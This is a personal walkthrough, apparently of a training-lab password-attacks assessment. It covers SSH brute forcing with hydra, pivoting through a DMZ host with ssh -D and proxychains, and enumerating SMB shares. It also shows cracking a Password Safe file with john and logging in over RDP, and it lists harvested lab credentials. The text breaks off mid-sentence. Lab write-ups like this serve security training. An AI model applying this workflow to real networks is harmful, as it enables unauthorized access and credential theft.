# Skills Assessment - Password Attacks

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

| Host     | IP Address                                                  |
| -------- | ----------------------------------------------------------- |
| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                              |
| `FILE01` | `172.16.119.10`                                             |
| `DC01`   | `172.16.119.11`                                             |

#### **Pivoting Primer**

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.

***

* What is the NTLM hash of NEXURA\Administrator?

We have onlye one cred, so... try to scan via nmap the ip -->

<pre><code>nmap -p- --open -sCV -Pn -n 10.129.234.116
<strong>
</strong><strong>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-29 07:20 CST
</strong>Nmap scan report for 10.129.234.116
Host is up (0.038s latency).
Not shown: 64627 closed tcp ports (reset), 907 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code></pre>

Now try to do bruteforce via ssh with hydra, but we havent the username, only have his full name: Betty Jayde. Use user\_anarchy for make a username dicctionary and do bruteforce -->

```
git clone git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy

./username-anarchy Betty Jayde > betty-user.txt
```

```
hydra -L betty-user.txt -p 'Texas123!@#' ssh://10.129.234.116

DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://10.129.234.116:22/
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
1 of 1 target successfully completed, 1 valid password found
```

```
ssh jbetty@10.129.234.116
jbetty@DMZ01:~$ whoami
jbetty
```

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

We can see another connections in the ifconfig but... after searching something interesting for a while, we can found creds into the file .bash\_history -->

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

`hwilliam : dealer-screwed-gym1`

We can see too the FILE01, and the information provided is -->

| Host     | IP Address                                                  |
| -------- | ----------------------------------------------------------- |
| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                              |
| `FILE01` | `172.16.119.10`                                             |
| `DC01`   | `172.16.119.11`                                             |

We need do a little pivoting using proxychains. Now I’ll check the configuration of proxychains **in my machine kali** to ensure `socks4 127.0.0.1 9050` is present under the `[ProxyList]` section:

```
sudo cat /etc/proxychains4.conf | grep socks4
#  socks4  192.168.1.49    1080
#  proxy types: http, socks4, socks5, raw
socks4  127.0.0.1 9050
```

Now, connect via ssh with the user jbetty again but using the flag -D to use the proxychain -->

```
ssh -D 9050 jbetty@10.129.234.116
```

Now I’ll scan the `FILE01` machine routing the traffic through proxychains (in us kali machine):

```
proxychains nmap -sT -Pn -p 445,135,3389,5985 172.16.119.10
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

PORT     STATE    SERVICE
135/tcp  filtered msrpc
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
5985/tcp filtered wsman
```

Nice, try to connect via smb using smbclient with the creds founded -->

> _NOTE: as the company is called Nexura, I assume that the Domain name is called `nexura`_

```
proxychains smbclient -L //172.16.119.10/ -U nexura\\hwilliam

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.10:445  ...  OK
Password for [NEXURA\hwilliam]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	HR              Disk      
	IPC$            IPC       Remote IPC
	IT              Disk      
	MANAGEMENT      Disk      
	PRIVATE         Disk      
	TRANSFER        Disk      
Reconnecting with SMB1 for workgroup listing.
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.10:139
```

I’ll connect to the `HR` share to inspect its contents:

```
proxychains smbclient //172.16.119.10/HR -U nexura\\hwilliam

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Password for [NEXURA\hwilliam]:
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.10:445  ...  OK
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Tue Apr 29 11:08:28 2025
  ..                                  D        0  Tue Apr 29 11:08:28 2025
  2024                                D        0  Tue Apr 29 11:08:16 2025
  2025                                D        0  Tue Apr 29 11:07:24 2025
  Archive                             D        0  Tue Apr 29 11:10:24 2025

		5056511 blocks of size 4096. 1580139 blocks available
smb: \> 
```

Inspecting `Archive` I found the following:

```
Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 17:09:57 2025
```

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

I’ll get it and try to crack it using jhon because it is a psafe3 file (**Password Safe v3**) Fristly, we need extract the password hash -->

```
pwsafe2john Employee-Passwords_OLD.psafe3 > psafe.hash
```

Now we can try to crack it -->

```
john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

`password : michaeljackson`

NICE XDD so... it is very similar than a keepass, login in this .psafe3 -->

> Note: Install it -->&#x20;
>
> sudo apt update> \
> sudo apt install passwordsafe

```
pwsafe Employee-Passwords_OLD.psafe3
```

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

JUMMM DELICIOUSSSSS. We has here users credentialsssss

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

#### Credentials Obtained

**DMZ01**

`jbetty : xiao-nicer-wheels5`

**Domain Users**

`bdavid : caramel-cigars-reply1`

`stom : fails-nibble-disturb4`

`hwilliam : warned-wobble-occur8`

***

As we have seen that the machine DMZ01 has ip to the 172.16.119.X, continue with the pivoting and make nmaps to the others ips -->

```
sudo proxychains -q nmap -sT -Pn -p 3389,445,135,22 172.16.119.7 --open -T4 -vv

PORT     STATE SERVICE       REASON
3389/tcp open  ms-wbt-server syn-ack
```

We can se the por 3389 for RDP, so... try to connect using the credentials obtained.

```
proxychains xfreerdp3 /v:172.16.119.7  /u:bdavid /p:'caramel-cigars-reply1' /clipboard /drive:htb_share,/home/eldeim
```

Once we are connect to the machine, can get three file .pcap -->

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

the one that catches my attention the most is the dhcp.pcap, examite it using wireshark but... there are a rabbit hole so... now try to dump the&#x20;
